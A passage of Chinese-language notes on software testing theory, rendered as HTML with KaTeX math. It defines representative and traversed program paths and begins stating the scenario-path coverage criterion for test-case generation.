class="mclose">)}</span></span></span></span></eq></li><li>程序路径是由节点序列组成的，从程序的起始节点开始，以一个终止节点结束。这条路径也可以被视为由路径上所有边构成的关系。为了避免任何可能的混淆，我们使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 来表示路径对应的关系。</li></ul><h5 id="define-9-representative-program-path" tabindex="-1">Define 9 representative program path</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>S</mi><mi>N</mi><mo separator="true">,</mo><mi>C</mi><mi>N</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=(S_0,SN,CN,R,T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq> 为程序，使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Rpp(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Rpp</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></eq> 表示程序的代表性路径集合，需要满足下面两个条件<ul><li>(1) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">∀</mi><mrow><mi>e</mi><mo>∈</mo><mi>R</mi><msub><mi mathvariant="normal">∃</mi><mrow><mi>p</mi><mo>∈</mo><mi>P</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow></msub><mo separator="true">⋅</mo><mi>e</mi><mo>∈</mo><mi>E</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">\forall_{e\in R \exist_{p\in Ppp(P)} · e \in E(p)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1333em;vertical-align:-0.4388em;"></span><span class="mord"><span class="mord">∀</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mtight"><span class="mord mtight">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">Ppp</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3695em;"><span></span></span></span></span></span></span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">e</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4388em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>(2) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">∀</mi><mrow><mi>p</mi><mo>∈</mo><mi>R</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow></msub><mo separator="true">⋅</mo><mi mathvariant="normal">¬</mi><msub><mi mathvariant="normal">∃</mi><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∈</mo><mi>R</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow></msub><mo separator="true">⋅</mo><mi>E</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>⊆</mo><mi>E</mi><mo stretchy="false">(</mo><mi>p</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall_{p\in Rpp(P)} · \neg \exist_{p_1\in Rpp(P)} · E(p) \subseteq E(p1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord">∀</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">Rpp</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">¬</span><span class="mord"><span class="mord">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">Rpp</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Rpp(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Rpp</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></eq> 并不代表 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的唯一一组代表程序路径，根据定义，它包含了覆盖 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的所有控制流边的所有程序路径，如条件 (1) 所示，并且不包含在其相应关系中重叠控制流边的不同程序路径，如条件 (2) 所暗示的。在本文中，我们总是使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Rpp(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Rpp</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></eq> 来表示基于测试需求确定的感兴趣的代表程序路径集合。</li></ul><h5 id="define-10-traversd-path" tabindex="-1">Define 10 traversd path</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>S</mi><mi>N</mi><mo separator="true">,</mo><mi>C</mi><mi>N</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=(S_0,SN,CN,R,T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">SN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CN</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq> 为程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的一个路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 被称为被遍历的，当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 被执行时，如果 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 中的所有节点都按照它们在路径上出现的顺序被执行（在语句的情况下）或评估（在条件的情况下），我们说 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 被遍历了。</li><li>根据以上10个定义，即可为测试用例生成定义标准</li></ul><h5 id="criterion-1%3Ascenario-path-coverage-(spc)" tabindex="-1">Criterion 1:scenario-path coverage (SPC)</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 为实现操作 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 的程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>2</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>n</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S_{pre}\wedge G_1 \wedge D_1) \vee ()S_{pre}\wedge G_2 \wedge D_2) \vee ... \vee (S_{pre}\wedge G_n \wedge D_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 为操作 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 的FSF. 令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 为从 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 中生成的测试集。 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 满足以下4个条件<ul><li>(1) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">∀</mi><mrow><mi>i</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>n</mi><mo stretchy="false">}</mo></mrow></msub><msub><mi mathvariant="normal">∃</mi><mrow><mi>t</mi><mi>c</mi><mo>∈</mo><mi>T</mi></mrow></msub><mo separator="true">⋅</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo stretchy="false">(</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo><mo>∧</mo><msub><mi>G</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall_{i\in\{1,...n\}} \exist_{tc\in T} · S_{pre}(tc)\wedge G_i(tc)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord">∀</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">∈</span><span class="mopen mtight">{</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">...</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">}</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></eq></li><li>(2) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi 